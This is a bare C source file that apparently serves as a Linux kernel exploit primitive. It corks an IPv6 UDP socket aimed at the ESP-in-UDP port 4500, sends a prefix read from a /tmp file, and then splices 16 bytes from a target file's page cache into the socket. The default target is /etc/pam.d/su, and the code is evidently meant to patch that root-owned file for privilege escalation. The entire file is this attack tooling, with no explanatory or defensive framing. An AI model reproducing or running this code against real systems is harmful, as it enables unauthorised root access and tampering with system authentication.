
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef UDP_CORK
#define UDP_CORK 1
#endif
#ifndef UDP_NO_CHECK6_TX
#define UDP_NO_CHECK6_TX 101
#endif
#ifndef SOL_UDP
#define SOL_UDP 17
#endif

#define ENC_PORT 4500

static void die(const char *what)
{
	fprintf(stderr, "%s: %s\n", what, strerror(errno));
	exit(1);
}

static unsigned char *read_file(const char *path, size_t *lenp)
{
	int fd = open(path, O_RDONLY);
	unsigned char *buf = NULL;
	size_t cap = 4096;
	size_t len = 0;

	if (fd < 0)
		die("open read_file");
	buf = malloc(cap);
	if (!buf)
		die("malloc");
	for (;;) {
		ssize_t ret;

		if (len == cap) {
			unsigned char *nbuf;

			cap *= 2;
			nbuf = realloc(buf, cap);
			if (!nbuf)
				die("realloc");
			buf = nbuf;
		}
		ret = read(fd, buf + len, cap - len);
		if (ret < 0)
			die("read");
		if (ret == 0)
			break;
		len += (size_t)ret;
	}
	close(fd);
	*lenp = len;
	return buf;
}

static void send_one(
	int sk,
	const char *path,
	off_t target_off,
	const unsigned char *prefix,
	size_t prefix_len)
{
	int file_fd = -1;
	int pfd[2] = { -1, -1 };
	int cork = 1;
	int uncork = 0;
	off_t off = target_off;
	ssize_t ret;

	if (setsockopt(sk, IPPROTO_UDP, UDP_CORK, &cork, sizeof(cork)) < 0)
		die("setsockopt UDP_CORK on");
	ret = send(sk, prefix, prefix_len, MSG_MORE);
	if (ret != (ssize_t)prefix_len)
		die("send prefix");
	file_fd = open(path, O_RDONLY);
	if (file_fd < 0)
		die("open target");
	if (pipe(pfd) < 0)
		die("pipe");
	ret = splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE);
	if (ret != 16)
		die("splice target");
	ret = splice(pfd[0], NULL, sk, NULL, 16, SPLICE_F_MOVE);
	if (ret != 16)
		die("splice sock");
	close(file_fd);
	close(pfd[0]);
	close(pfd[1]);
	if (setsockopt(sk, IPPROTO_UDP, UDP_CORK, &uncork, sizeof(uncork)) < 0)
		die("setsockopt UDP_CORK off");
}

int main(int argc, char **argv)
{
	const char *target_path = argc > 1 ? argv[1] : "/etc/pam.d/su";
	const char *dst = argc > 2 ? argv[2] : "fd00:1::2";
	const char *prefix_path = argc > 3 ? argv[3] : "/tmp/f001_patch_prefix.bin";
	off_t target_off = argc > 4 ? (off_t)strtoull(argv[4], NULL, 0) : 0;
	unsigned int send_count = argc > 5 ? (unsigned int)strtoul(argv[5], NULL, 0) : 1;
	unsigned int hold_usec = argc > 6 ? (unsigned int)strtoul(argv[6], NULL, 0) : 1000000;
	const char *guard_path = argc > 7 ? argv[7] : target_path;
	unsigned int guard_before = argc > 8 ? (unsigned int)strtoul(argv[8], NULL, 0) : 0;
	unsigned char *prefix;
	size_t prefix_len;
	struct sockaddr_in6 sa;
	int sk;
	int one = 1;
	unsigned int i;

	if (send_count == 0)
		send_count = 1;
	if (send_count > 4096)
		send_count = 4096;
	if (guard_before > 4096)
		guard_before = 4096;

	prefix = read_file(prefix_path, &prefix_len);
	if (prefix_len == 0)
		die("empty packet component");

	sk = socket(AF_INET6, SOCK_DGRAM, 0);
	if (sk < 0)
		die("socket");
	if (setsockopt(sk, IPPROTO_UDP, UDP_NO_CHECK6_TX, &one, sizeof(one)) < 0)
		die("setsockopt UDP_NO_CHECK6_TX");
	memset(&sa, 0, sizeof(sa));
	sa.sin6_family = AF_INET6;
	sa.sin6_port = htons(ENC_PORT);
	if (inet_pton(AF_INET6, dst, &sa.sin6_addr) != 1)
		die("inet_pton dst");
	if (connect(sk, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("connect");

	for (i = 0; i < guard_before; i++)
		send_one(sk, guard_path, target_off, prefix, prefix_len);
	for (i = 0; i < send_count; i++)
		send_one(sk, target_path, target_off, prefix, prefix_len);

	printf("patch-splice-sent targets=%u guard_before=%u prefix_len=%zu target_off=%lld\n",
	       send_count, guard_before, prefix_len, (long long)target_off);
	fflush(stdout);
	usleep(hold_usec);
	free(prefix);
	close(sk);
	return 0;
}
